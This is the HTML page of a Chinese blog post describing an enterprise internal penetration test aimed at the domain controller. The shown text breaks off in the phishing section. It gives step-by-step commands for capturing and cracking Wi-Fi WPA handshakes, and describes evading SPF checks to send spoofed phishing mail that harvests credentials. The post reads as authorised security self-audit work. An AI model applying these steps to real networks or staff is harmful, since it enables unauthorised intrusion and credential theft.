@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="🕹️ 撸向域控 | 一次完整的内网攻击链实战📍 前言最近在做企业内部安全自查时，有幸面对一个完整、真实的域环境进行渗透。之前学习了很多域渗透相关的知识，但是一直苦于没有真实的环境用以实战，所以此次安全自查将之前涉及到的内网扫描、爆破、横向移动、Hash 抓取、信息收集、权限维持、数据回传、端口转出、内网代理、免杀等等都测试了一遍，又有了非常多新的感触。 先说说结果吧，因为第一次针对真实环境进行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="🕹️ 撸向域控 | 一次完整的内网攻击链实战">
+<meta property="og:url" content="https://naykcin.top/2020/09/05/intra-fuck/index.html">
+<meta property="og:site_name" content="Naykcin&#39;s Page">
+<meta property="og:description" content="🕹️ 撸向域控 | 一次完整的内网攻击链实战📍 前言最近在做企业内部安全自查时，有幸面对一个完整、真实的域环境进行渗透。之前学习了很多域渗透相关的知识，但是一直苦于没有真实的环境用以实战，所以此次安全自查将之前涉及到的内网扫描、爆破、横向移动、Hash 抓取、信息收集、权限维持、数据回传、端口转出、内网代理、免杀等等都测试了一遍，又有了非常多新的感触。 先说说结果吧，因为第一次针对真实环境进行">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%884.36.56.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.18.39.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.20.07.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/smtp.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%885.45.56.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/test.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/phish_mail.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/phish_web.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/victim1.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/victim.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%884.57.01.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.05.44.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.09.03.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.02.18.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.21.02.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%882.40.25.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.31.12.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.32.51.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/schtasks.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.33.36.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.34.38.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.28.49.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.10.28.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.32.13.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/intra_scan.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-09%20%E4%B8%8A%E5%8D%8810.48.38.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/CVE-2020-0796.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/hashes.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.36.37.jpg">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/psexec.png">
+<meta property="og:image" content="https://naykcin.top/2020/09/05/intra-fuck/lm.jpg">
+<meta property="og:updated_time" content="2020-09-09T08:16:10.253Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="🕹️ 撸向域控 | 一次完整的内网攻击链实战">
+<meta name="twitter:description" content="🕹️ 撸向域控 | 一次完整的内网攻击链实战📍 前言最近在做企业内部安全自查时，有幸面对一个完整、真实的域环境进行渗透。之前学习了很多域渗透相关的知识，但是一直苦于没有真实的环境用以实战，所以此次安全自查将之前涉及到的内网扫描、爆破、横向移动、Hash 抓取、信息收集、权限维持、数据回传、端口转出、内网代理、免杀等等都测试了一遍，又有了非常多新的感触。 先说说结果吧，因为第一次针对真实环境进行">
+<meta name="twitter:image" content="https://naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%884.36.56.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/earth.png">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/earth.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/earth.png">
+          
+        
+    
+    <!-- title -->
+    <title>🕹️ 撸向域控 | 一次完整的内网攻击链实战</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/nickyan7">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/06/26/ssrf-gopher/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://naykcin.top/2020/09/05/intra-fuck/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://naykcin.top/2020/09/05/intra-fuck/&text=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://naykcin.top/2020/09/05/intra-fuck/&is_video=false&description=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=🕹️ 撸向域控 | 一次完整的内网攻击链实战&body=Check out this article: https://naykcin.top/2020/09/05/intra-fuck/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://naykcin.top/2020/09/05/intra-fuck/&title=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://naykcin.top/2020/09/05/intra-fuck/&name=🕹️ 撸向域控 | 一次完整的内网攻击链实战&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://naykcin.top/2020/09/05/intra-fuck/&t=🕹️ 撸向域控 | 一次完整的内网攻击链实战"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#🕹️-撸向域控-一次完整的内网攻击链实战"><span class="toc-number">1.</span> <span class="toc-text">🕹️ 撸向域控 | 一次完整的内网攻击链实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#📍-前言"><span class="toc-number">1.1.</span> <span class="toc-text">📍 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#💡-思路"><span class="toc-number">1.2.</span> <span class="toc-text">💡 思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wi-Fi-渗透"><span class="toc-number">1.2.1.</span> <span class="toc-text">Wi-Fi 渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#🎣-邮件钓鱼"><span class="toc-number">1.2.2.</span> <span class="toc-text">🎣 邮件钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP-协议"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SMTP 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SPF-校验"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">SPF 校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DKIM"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">DKIM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DMARC"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">DMARC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#钓鱼攻击思路"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">钓鱼攻击思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#🕹️-内网渗透"><span class="toc-number">1.3.</span> <span class="toc-text">🕹️ 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前期准备"><span class="toc-number">1.3.1.</span> <span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限维持"><span class="toc-number">1.3.2.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#放置后门"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">放置后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#计划任务"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网通信隧道"><span class="toc-number">1.3.3.</span> <span class="toc-text">内网通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内网端口转发和映射"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">内网端口转发和映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内网代理"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据传入和传出"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">数据传入和传出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网信息收集"><span class="toc-number">1.3.4.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内网扫描"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#定位域控"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">定位域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量-POC-扫描"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">批量 POC 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#横向移动"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#离线导出-Hash"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">离线导出 Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#意外发现"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">意外发现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击域控"><span class="toc-number">1.3.5.</span> <span class="toc-text">攻击域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Hash"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">Pass the Hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结复盘"><span class="toc-number">1.4.</span> <span class="toc-text">总结复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击链"><span class="toc-number">1.4.1.</span> <span class="toc-text">攻击链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于-PTH-攻击的原理及技术细节问题"><span class="toc-number">1.4.2.</span> <span class="toc-text">关于 PTH 攻击的原理及技术细节问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后话"><span class="toc-number">1.5.</span> <span class="toc-text">后话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#🌍-参考"><span class="toc-number">1.6.</span> <span class="toc-text">🌍 参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        🕹️ 撸向域控 | 一次完整的内网攻击链实战
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Naykcin's Page</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-05T08:08:40.000Z" itemprop="datePublished">2020-09-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="🕹️-撸向域控-一次完整的内网攻击链实战"><a href="#🕹️-撸向域控-一次完整的内网攻击链实战" class="headerlink" title="🕹️ 撸向域控 | 一次完整的内网攻击链实战"></a><center>🕹️ 撸向域控 | 一次完整的内网攻击链实战</center></h1><h2 id="📍-前言"><a href="#📍-前言" class="headerlink" title="📍 前言"></a>📍 前言</h2><p>最近在做企业内部安全自查时，有幸面对一个完整、真实的域环境进行渗透。之前学习了很多域渗透相关的知识，但是一直苦于没有真实的环境用以实战，所以此次安全自查将之前涉及到的内网扫描、爆破、横向移动、Hash 抓取、信息收集、权限维持、数据回传、端口转出、内网代理、免杀等等都测试了一遍，又有了非常多新的感触。</p>
+<p>先说说结果吧，因为第一次针对真实环境进行域渗透，其中误打误撞也有不少收获，直至最后拿下了域控，形成了一条完整的攻击链。攻击的发起点有两个：邮件钓鱼和 Wi-Fi 渗透，因为这两种攻击都可以直抵办公网进入 AD 域。</p>
+<h2 id="💡-思路"><a href="#💡-思路" class="headerlink" title="💡 思路"></a>💡 思路</h2><h3 id="Wi-Fi-渗透"><a href="#Wi-Fi-渗透" class="headerlink" title="Wi-Fi 渗透"></a>Wi-Fi 渗透</h3><p>其实很多企业的物理安全做的属实令人一言难尽，攻击者可以尾随其他员工进入公司，找个地方坐下截取 Wi-Fi 通信的数据包，然后爆破 Wi-Fi 登录口令；或者找个没人的工位，拿根网线一连，好家伙，连爆破都省了，直接进内网。</p>
+<p>截取 Wi-Fi 通信数据包有很多种方法，这里简单记录下 macOS 的抓包方式：airport。</p>
+<p>airport 是 macOS 自带的无线网络调试工具，位于 <em><code>/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport</code></em> ，我的机器是 macOS 10.4.6 Mojave，这个版本的 airport 似乎有一些 bug，无法持续地截取 Wi-Fi 通信的数据包，这一点蛮坑的，所以我只好用 tcpdump 来抓包，蛋疼啊。</p>
+<p>Wi-Fi 渗透的思路比较简单：抓取 Wi-Fi 通信数据包爆破口令 👉🏻 登录进入内网开始扫描。</p>
+<p>首先方便起见可以将 <code>airport</code> 用软链接加入 <em><code>/usr/local/bin</code></em> 目录下。</p>
+<p><code>airport -s</code> ，查看附近的 Wi-Fi 信息：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%884.36.56.jpg" alt="Screenshot 2020-09-05 下午4.36.56"></p>
+<p>要用到 <code>BSSID</code> 和 <code>CHANNEL</code> ，提前保存一下。<code>BSSID</code> 表示无线路由器的 MAC 地址，<code>CHANNEL</code> 表示频道。另外，<code>RSSI</code> 表示信号强度，一般来说能量 <code>-60dBm</code> 左右的信号是最好的。</p>
+<p>然后开始尝试抓包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 断开所有 Wi-Fi 连接</span><br><span class="line">$ airport -z</span><br><span class="line"></span><br><span class="line">2. 切换到对应的 Wi-Fi 的频道，注意 -c 和后面的频道数字不要留空格</span><br><span class="line">$ airport -c44</span><br><span class="line"></span><br><span class="line">3. 由于 airport 对于 mojave 有 bug，所以这里使用 tcpdump 抓包</span><br><span class="line">$ sudo tcpdump &quot;type mgt subtype beacon and ether src 填入对应路由器的BSSID信息&quot; -I -c 1 -i en0 -w ~/Desktop/beacon.cap</span><br><span class="line"></span><br><span class="line">// 执行这条命令时要注意，需要抓取到大于 4 个数据包，然后 ctrl-c 停止抓包即可</span><br><span class="line">$ sudo tcpdump &quot;ether proto 0x888e and ether host 填入对应路由器的BSSID信息&quot; -I -U -vvv -i en0 -w ~/Desktop/handshake.cap</span><br><span class="line"></span><br><span class="line">$ mergecap -a -F pcap -w ~/Desktop/capture.cap ~/Desktop/beacon.cap ~/Desktop/handshake.cap</span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 注意，执行第二条抓取通信数据包的命令时，通常需要抓取大于或等于 4 个数据包，如图：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.18.39.jpg" alt="Screenshot 2020-08-14 上午10.18.39"></p>
+<p>执行以上命令之后，最后会生成数据包文件： <em><code>~/Desktop/capture.cap</code></em> 。</p>
+<p>其实这种攻击的原理是截取网络中其他人与无线 AP 之间的通信，然后通过字典枚举来对接入者连接 Wi-Fi 时输入的口令进行碰撞来模拟登录，通过对比数据包内的信息来暴力破解，这就出现了一个问题：我们爆破的是「接入者」输入的口令，所以他必须输入正确的 Wi-Fi 密码才行，否则如果接入者在输入密码时随手输入了 <code>12345678</code> ，那我们成功抓取后也可以爆破出 <code>12345678</code> ，然而这并不是真正的 Wi-Fi 口令。</p>
+<p>完成抓包之后就可以开始爆破了，需要一个暴力破解的工具和一个好用的字典。工具可以用 <code>aircrack-ng</code> 套件或者 <code>hashcat</code> ，我这里用的是 <code>aircrack-ng</code> ，macOS 安装起来也比较方便。</p>
+<p>键入命令 <code>aircrack-ng -w dic.txt capture.cap</code> 开始爆破：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.20.07.jpg" alt="Screenshot 2020-08-14 上午10.20.07"></p>
+<p>这里就破解成功了，然后我们就可以手牵着手一起进入内网啦。</p>
+<p>然而，怎么可能会这么轻易就让你进内网呢？可以看到企业的 Wi-Fi 分成了三段：Public、Staff、Intra，我们爆破出了 Public、Staff 的口令，然而 Public 是公用 Wi-Fi，与内网是隔离的，扫了一下也没啥收获；Staff 是员工使用的网络，做了 MAC 绑定；最重要的 Intra 有部署准入规则，且绑定了 MAC，还有其他的一些防护手段，即使找个空的工位插根网线直连 Intra 也过不了准入，无法分配 IP，Wi-Fi 渗透走到这一步似乎终结了。</p>
+<blockquote>
+<p>🌍 Wi-Fi 渗透的一些参考</p>
+<ul>
+<li><a href="https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html" target="_blank" rel="noopener">https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html</a><ul>
+<li>Stackoverflow 关于 macOS 10.14 Mojave 下 airport 抓包报错的一个解决方案</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="🎣-邮件钓鱼"><a href="#🎣-邮件钓鱼" class="headerlink" title="🎣 邮件钓鱼"></a>🎣 邮件钓鱼</h3><p>Wi-Fi 渗透进入内网失败，只好换个思路，从邮件钓鱼入手。企业邮件安全其实是大公司都很头疼的一个问题，因为这里的弱点出现在人身上，而人是最难以掌控的，而有些人被骗之后，你劝他他还会觉得你是骗子，所以对于攻击者来说钓鱼邮件真是屡试不爽。</p>
+<p>这还是我头一次做邮件钓鱼攻击，中途学习了关于邮件安全的不少东西。</p>
+<h4 id="SMTP-协议"><a href="#SMTP-协议" class="headerlink" title="SMTP 协议"></a>SMTP 协议</h4><p>简单邮件传输协议，在早期其实是有很多问题的，以下讲到的 spf 校验、DKIM、DMARC 其实都是为了补足当初的安全问题而提出的防护性措施。SMTP 协议和 HTTP 协议其实很相似，早期都是明文协议，也有状态码的概念， <code>250</code> 表示邮件发送成功，整个 SMTP 协议的报文分为两类：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/smtp.jpg" alt="smtp"></p>
+<p>其中信封中有 <code>MAIL FROM</code> 字段，信的内容中也有 <code>MAIL FROM</code> 字段，这时问题就出现了。一般邮箱客户端不会显示整个报文，只显示邮件的内容部分，那么我们通过伪造内容中的 <code>MAIL FROM</code> （发件人）字段，来迷惑收件人，但这还不够。</p>
+<h4 id="SPF-校验"><a href="#SPF-校验" class="headerlink" title="SPF 校验"></a>SPF 校验</h4><p>SPF，Sender Policy Framework，发件人策略框架。SMTP 协议不需要身份认证，利用这个特性可以伪造任意发件人。为了防止邮箱伪造，就出现了 SPF。当你定义了你域名的 SPF 记录后，接收邮件方会根据你的 SPF 记录来判断发送过来的 IP 地址是否被包含在 SPF 记录里面，如果在，则认为是一封正常的邮件，否则则认为是一封伪造的邮件。现在大部份反垃圾邮件系统都支持 SPF 验证，当然也有些低级邮箱不支持，或者域名本身没有设置 SPF 记录，所以就可以伪造邮件。</p>
+<p>其实邮件钓鱼，第一点就是要绕过 spf 校验，其他的邮件网关的关键字过滤等策略可以慢慢 fuzz。spf 是为了防范垃圾邮件而提出的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。首先来看看 spf 长啥样，我们瞅瞅华为的 spf 记录：</p>
+<p><code>nslookup -q=TXT huawei.com</code></p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%885.45.56.jpg" alt="Screenshot 2020-09-05 下午5.45.56"></p>
+<p>一般 spf 的格式是： <code>v=spf1 [[pre] type [ext]] ... [mod]</code> 。</p>
+<p>解释一下：</p>
+<blockquote>
+<ol>
+<li><code>v=spf1</code> 表示 spf 的版本。</li>
+<li><code>pre</code> 定义匹配时的返回值，包括：<ul>
+<li><code>+</code> 默认值，测试完成后表示通过校验。</li>
+<li><code>-</code> 表示硬失败，通常的值是 <code>-all</code> ，表示没有任何 IP 匹配，测试失败，针对这种邮件，邮件网关会直接阻断。</li>
+<li><code>~</code> 表示软失败， <code>~all</code> 表示测试没有完成，可能是因为 IP 不匹配，也有其他原因，邮件网关对于这类邮件可能会丢入垃圾桶，但是目前大部分企业邮件网关选择阻断。</li>
+<li><code>?</code> 表示不置可否，这个值也通常在测试没有完成的时候使用。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>也就是说，只有从这些记录的 IP 发出的邮件才是可信的邮件，否则都存在问题，至于阻断还是丢入垃圾桶还是放过，这就要看具体的邮件网关的策略了。</p>
+<h4 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h4><p>DKIM 是为了防止电子邮件欺诈的一种技术，同样依赖于 DNS 的 TXT 记录类型，一般用来校验邮件的完整性。这个技术需要<strong>将发件方公钥写入域名的</strong> <strong>TXT</strong> <strong>记录，收件方收到邮件后，通过查询发件方</strong> <strong>DNS</strong> <strong>记录找到公钥，来解密邮件内容。</strong></p>
+<h4 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h4><p>DMARC 是 TXT 记录中的一种，是一种基于现有的 SPF 和 DKIM 协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。</p>
+<h4 id="钓鱼攻击思路"><a href="#钓鱼攻击思路" class="headerlink" title="钓鱼攻击思路"></a>钓鱼攻击思路</h4><p>基础知识大概就是这些，接下来我们谈谈攻击思路。</p>
+<p>我们首先面对的问题是如何绕过 spf 校验。在收到一封邮件时，邮件网关通常会去查询对应域的 spf 记录，如果和收到的邮件的 IP 不符，那么邮件网关肯定会直接阻断，可是我们又没有 huawei 之类的 IP，所以「绕过」不是个好法子，不如我们就直接用真实且对应 spf 的 IP 来进行攻击。</p>
+<p>两个思路：</p>
+<ul>
+<li>自己搭建邮件服务器<ul>
+<li>gophish + VPS</li>
+<li>wordpress + sendgrid</li>
+</ul>
+</li>
+<li>利用邮件分发平台<ul>
+<li>在线邮件发送</li>
+<li>smtp2go</li>
+</ul>
+</li>
+</ul>
+<p>自己搭建邮件服务器，最主要的是邮箱信誉度的问题，如果信誉度较差，那么也会被邮件网关阻断，所以利用邮件分发平台是一个不错的思路，但是很多邮件分发平台存在注册、收费的问题，匿名性较低。</p>
+<p>一顿操作之后，发现还是 smtp2go + swaks + setoolkit 最好使，整体的攻击思路是：制作钓鱼邮件，伪造发件人字段，通过 spf 校验 👉🏻 钓鱼邮件中放入迷惑性内容，放入钓鱼网站地址从而获取目标域内 IP、账号和密码 👉🏻 拿到帐密之后，利用现有权限进行信息收集和权限扩张。</p>
+<p>首先钓鱼邮件的伪造部分，就必须得用到 swaks 了，其被称为 SMTP 协议的瑞士军刀，可以很灵活地操作 SMTP 报文，值得好好学习一番。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/test.jpg" alt="test"></p>
+<p>通过校验的钓鱼邮件（事后捕获）：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/phish_mail.png" alt="phish_mail"></p>
